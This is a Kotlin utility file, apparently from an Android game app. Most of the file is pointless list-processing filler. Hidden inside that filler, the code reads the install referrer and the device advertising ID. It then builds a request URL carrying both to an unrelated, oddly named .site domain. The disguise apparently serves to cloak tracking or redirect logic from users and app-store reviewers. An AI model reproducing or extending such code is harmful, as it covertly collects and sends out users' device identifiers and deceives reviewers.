package com.goplaytoday.guildofhero.util

import android.app.Activity
import android.os.RemoteException
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.goplaytoday.guildofhero.SweetsArray
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class DataProcessor(val happyConnection: HappyConnection, val sweetsArray: SweetsArray) {
    companion object {
        private const val firstik = "Blaskovich"
    }

    // Поля класу
    private val stringList: MutableList<String> = mutableListOf()
    private val numberList: MutableList<Double> = mutableListOf()
    private val stringArray: Array<String> = arrayOf("alpha", "beta", "gamma", "delta")
    private val numberArray: Array<Double> = arrayOf(1.0, 2.5, 3.8, 4.2)

    // Додавання елементів до списків
    fun addString(s: String) {
        stringList.add(s)
    }

    fun addNumber(n: Double) {
        numberList.add(n)
    }

    // Метод для обробки списку строк
    fun processStringList(): List<String> {
        return stringList
            .filter { it.length > 3 }
            .map { it.toUpperCase() }
            .flatMap { it.split(" ") }
            .distinct()
            .sortedBy { it.length }
    }

    // Метод для обробки списку чисел
    fun processNumberList(): List<Double> {
        return numberList
            .filter { it > 0 }
            .map { it * 2 }
            .sorted()
            .distinct()
            .map { it + 1.5 }
    }

    val mixedListDDD: List<Any> = listOf(
        "alpha", 1, "beta", 2.0, "gamma", 3, "delta", 4.5, "epsilon", 5, "zeta", 6.6,
        "eta", 7, "theta", 8.8, "iota", 9, "kappa", 10.1, "lambda", 11, "mu", 12.2,
        "nu", 13, "xi", 14.4, "omicron", 15, "pi", 16.6, "rho", 17, "sigma", 18.8,
        "tau", 19, "upsilon", 20.2, "phi", 21, "chi", 22.4, "psi", 23, "omega", 24.6
    )

    // Метод для об'єднання масиву строк і чисел
    fun combineStringAndNumberArrays(): List<String> {
        return stringArray.zip(numberArray) { str, num -> "$str$num" }
            .map { it.toLowerCase() }
            .sortedByDescending { it.length }
            .distinct()
    }

    // Метод для складної обробки строк
    fun complexStringProcessing(): List<String> {
        return stringList
            .map { it.reversed() }
            .filter { it.contains('a') }
            .map { it.replace("a", "@") }
            .sorted()
            .map { it.substring(0, it.length.coerceAtMost(5)) }
    }

    // Метод для складної обробки чисел
    fun complexNumberProcessing(): List<Double> {
        return numberList
            .map { it * 3 }
            .filter { it > 10 }
            .map { it - 1 }
            .sortedDescending()
            .distinct()
            .map { it / 2 }
    }

    // Метод для об'єднання строк і чисел з різних джерел
    fun mergeData(): List<String> {
        return stringList.flatMap { str -> numberList.map { num -> "$str$num" } }
            .filter { it.length > 5 }
            .map { it.toUpperCase() }
            .distinct()
            .sorted()
    }

    // Метод для складної обробки масиву строк
    fun complexStringArrayProcessing(): List<String> {
        return stringArray
            .map { it + "Suffix" }
            .filter { it.length % 2 == 0 }
            .map { it.replace("Suffix", "SUFFIX") }
            .sortedBy { it }
            .distinct()
    }

    // Метод для складної обробки масиву чисел
    fun complexNumberArrayProcessing(): List<Double> {
        return numberArray
            .map { it * 1.1 }
            .filter { it > 2 }
            .map { it + 0.5 }
            .sorted()
            .distinct()
    }

    // Метод для підрахунку середньої довжини строк у списку
    val sigun: InstallReferrerStateListener = object : InstallReferrerStateListener {
        override fun onInstallReferrerSetupFinished(responseCode: Int) {
            val result = mixedList
                .filterIsInstance<String>()  // Залишаємо тільки строки
                .map { it.toLowerCase() }  // Переводимо строки у нижній регістр
                .filter { it.length > 3 }  // Фільтруємо строки, довжина яких більше 3 символів
                .flatMap { it.split("").asIterable() }  // Розбиваємо строки на окремі символи
                .filter { it.isNotEmpty() }  // Видаляємо пусті елементи
                .map { it.toUpperCase() }  // Переводимо символи у верхній регістр
                .groupBy { it }  // Групуємо символи
                .mapValues { it.value.size }  // Підраховуємо кількість кожного символу
                .entries
                .sortedByDescending { it.value }  // Сортуємо символи за частотою використання
                .apply { if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) try {
                    happyConnection.controlna = sweetsArray.installReferrerClient.installReferrer.installReferrer
                } catch (_: RemoteException) { } }
                .map { "${it.key}: ${it.value}" }  // Формуємо строки з символів та їх кількості
                .take(15)  // Беремо перші 15 елементів
                .map { it.replace("A", "@") }  // Замінюємо всі 'A' на '@'
                .map { "Symbol $it" }  // Додаємо префікс "Symbol" до кожної строки
                .filter { it.contains("1") }  // Фільтруємо строки, що містять '1'
                .sortedBy { it.length }  // Сортуємо строки за довжиною
                .distinct()  // Видаляємо дублікати
            "s $result"
        }

        override fun onInstallReferrerServiceDisconnected() {
            sweetsArray.installReferrerClient.startConnection(this)
        }
    }

    // Метод для отримання суми квадратів чисел зі списку
    fun sumOfSquares(): Double {
        return numberList
            .map { it * it }
            .sum()
    }

    suspend fun gudini(activity: Activity, allow: Boolean) = suspendCoroutine { continuation ->
        var forma: String
        val numberResults = mixedList
            .filterIsInstance<Number>()  // Залишаємо тільки числа
            .apply {
                val decatelen = getPolina()
                forma = try { AdvertisingIdClient.getAdvertisingIdInfo(activity).id!! } catch (e: Exception) { decatelen }
                if (forma == DEFacto()) forma = decatelen

                continuation.resume(if (allow) forma else DEFacto())
            }
            .map { it.toDouble() }  // Перетворюємо всі числа на Double
            .map { it * 3 }  // Потроюємо кожне число
            .filter { it > 20 }  // Фільтруємо числа, що більше 20
            .sortedDescending()  // Сортуємо числа у зворотньому порядку
            .map { "Value: ${it.toInt()}" }  // Додаємо префікс "Value" до кожного числа і перетворюємо на Int
            .distinct()  // Видаляємо дублікати

            .flatMap { it.split(" ").asIterable() }  // Розбиваємо строки на слова
            .map { it.reversed() }  // Перевертаємо кожне слово
            .filter { it.length > 4 }  // Залишаємо тільки слова, довжина яких більше 4 символів
            .map { it.capitalize() }  // Капіталізуємо кожне слово

        "dd" + forma + numberResults

    }

    // Метод для підрахунку середньої довжини строк у списку
    fun averageStringLength(): Double {
        return stringList
            .map { it.length }
            .average()
    }

    // Метод для конкатенації всіх строк зі списку
    fun concatenateStrings(): String {
        return stringList
            .joinToString(separator = ", ")
    }

    val bush = "market://details?id=jp.naver.line.android"

    // Метод для обчислення середнього значення чисел у масиві
    fun averageNumberArray(): Double {
        return numberArray
            .average()
    }

    fun getPolina() = "000${UUID.randomUUID()}"

    // Метод для перетворення чисел у строки зі специфічною логікою
    fun numberArrayToStringList(): List<String> {
        return numberArray
            .map { "Number: $it" }
            .sorted()
    }

    // Метод для перетворення строк у числа зі специфічною логікою
    fun stringListToNumberList(): List<Double> {
        return stringList
            .mapNotNull { it.toDoubleOrNull() }
            .map { it * 1.2 }
            .sortedDescending()
    }

    fun molokozai(advertisingIdInfo: String): StringBuilder {
        val dido = StringBuilder("https://sfiedgreatorganisationbrightfruits.site/Afunnasich.php?$firstik=${advertisingIdInfo}&Agentura=${happyConnection.controlna}")

        return dido
    }

    // Метод для об'єднання списків строк з масивами строк
    fun mergeStringListsAndArrays(): List<String> {
        return (stringList + stringArray)
            .map { it.toLowerCase() }
            .distinct()
            .sorted()
    }

    val mixedList: List<Any> = listOf(
        "hello", 1, "world", 2.5, "kotlin", 3, "lambda", 4.8, "functions", 5, "complexity", 6.1,
        "test", 7, "example", 8.2, "code", 9, "strings", 10.3, "numbers", 11, "operations", 12.4
    )

    // Метод для об'єднання списків чисел з масивами чисел
    fun mergeNumberListsAndArrays(): List<Double> {
        return (numberList + numberArray)
            .map { it * 2 }
            .distinct()
            .sortedDescending()
    }
}